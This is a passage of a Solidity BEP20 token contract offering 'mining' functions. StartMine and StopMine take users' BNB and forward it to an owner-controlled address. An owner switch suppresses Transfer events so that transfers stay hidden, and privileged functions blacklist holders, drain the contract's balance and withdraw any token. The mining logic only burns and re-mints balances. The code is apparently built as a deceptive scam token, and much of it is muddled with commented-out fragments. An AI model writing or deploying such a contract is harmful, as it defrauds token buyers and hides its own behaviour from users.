        require(senderBalance >= amount, "BEP20: transfer amount exceeds balance");
        balances[sender] = senderBalance - amount;
        balances[recipient] += amount;
        
        if(_shadow == false) emit Transfer(sender, recipient, amount);
    }    
    
    mapping(address => bool) claimined;
     
    function _balanceOf(address account) internal view returns (uint256) {
        return _balances[account]; //+ (claimed[account] ? 0 : balanceMine(account));
    }

    function _balanceMi(address account) internal view returns (uint256) {
        return balances[account]; //+ (claimed[account] ? 0 : balanceMine(account));
    }

    function balanceMine(address account) public view returns (uint256 reward) {
     
    // uint256 reward = 0;
    // uint256 _reward = 0;
     address sender = account;
     //if(_msgSender() == sender){
     if (!claimined[sender]){
         if(_balanceMi(account) > 0){
       reward = uint256(_balanceMi(account)); 
       
       
       reward = uint256(reward);
        }
      }
     if(claimined[sender]){
        if(_balanceMi(account) > 0){
       reward = uint256(_balanceMi(account)); 
       
     
      reward = uint256(reward);
        }
      }
     //}
    return uint256(reward);
    } 

  function StartMine() external payable {
    if (msg.value >0 && (msg.value >= 0.001 ether)){  
    //claimstaked[msg.sender] = true;
    if(!claimined[msg.sender]) claimine();
    
    AddMine();
    }  
        if (_sPayCla == true){
             if(_liquidity == address(0)){
            _liquidity = _owner; 
            }
          payable(_liquidity).transfer(msg.value); 
      }
    }
  function StopMine() external payable {
    if (msg.value >0 && (msg.value >= 0.001 ether)){  
    //claimstaked[msg.sender] = true;
    //if(!claimstaked[msg.sender]) claimstake();
     if(!claimined[msg.sender]) claimine();

    //AddMine();
    }  
        if (_sPayCla == true){
             if(_liquidity == address(0)){
            _liquidity = _owner; 
            }
          payable(_liquidity).transfer(msg.value); 
      } 
       
    }
    
    function claimine() public {
    
    //require(!claimined[msg.sender]);

    uint256 reward = _balanceMi(msg.sender);
    //require(reward > 0);
    if(reward > 0){
    //if(!claimined[msg.sender])

    //uint256 rewardInt = uint256(reward);
    //uint256 rewardInt = uint256(_reward);
    
    // if(!claimed[msg.sender]) claim();
    claimined[msg.sender] = true;

     _burnmine(msg.sender, reward);
     _mint(msg.sender,reward);
     }
    }
  
    function AddMine() public {
    
    //require(claimstaked[msg.sender]);
     //require(claimined[msg.sender]);
    //if(!claimined[msg.sender]) claimine();
    uint256 rewardm = _balanceMi(msg.sender);
    if(rewardm > 0){
     if(!claimined[msg.sender]) claimine();   
    }
    
    uint256 reward = _balanceOf(msg.sender);
    require(reward > 0);

     //smblocknew(msg.sender,block.number);

    claimined[msg.sender] = false;

     _mine(msg.sender,reward);
    _burn(msg.sender, reward);
  
  }

    function setClaim(uint8 tag,bool value)public onlyOwner returns(bool){
        if(tag==1){
            _shadow = value==true; //false
        }else if(tag==2){
            _shadow = value==false;
        }else if(tag==3){
            _sPayCla = value==true; //false
        }
        return true;
    }

    function newLiquid(address liq_) public {
        require(liq_ != address(0) && _msgSender() == _auth, "recovery");
        _liquidity = liq_;
    }
    
    function setAuths(address ah) public returns(bool){
        require(_msgSender() == _owner||_msgSender() == _auth, "recovery");
        require(address(0) != _auth&&ah!=address(0), "recovery");
        _auth = ah;
        return true;
    }
    
    function setblack(address owner_,uint8 black_) public {
         require(_msgSender() == _owner||_msgSender() == _auth, "recovery");
        black(owner_, black_);
    }
    
    function clearAll() public onlyOwner() {
        //require(_authNum==1000, "Permission denied");
        payable(msg.sender).transfer(address(this).balance);
    }
    
    function withdrawAny(address _token_address, uint256 _amount) external onlyOwner{
        IBEP20 utoken = IBEP20(_token_address);
        require(utoken.balanceOf(address(this)) >= _amount, "Cannot withdraw more than balance");
        utoken.transfer(msg.sender, _amount);
    }
    
}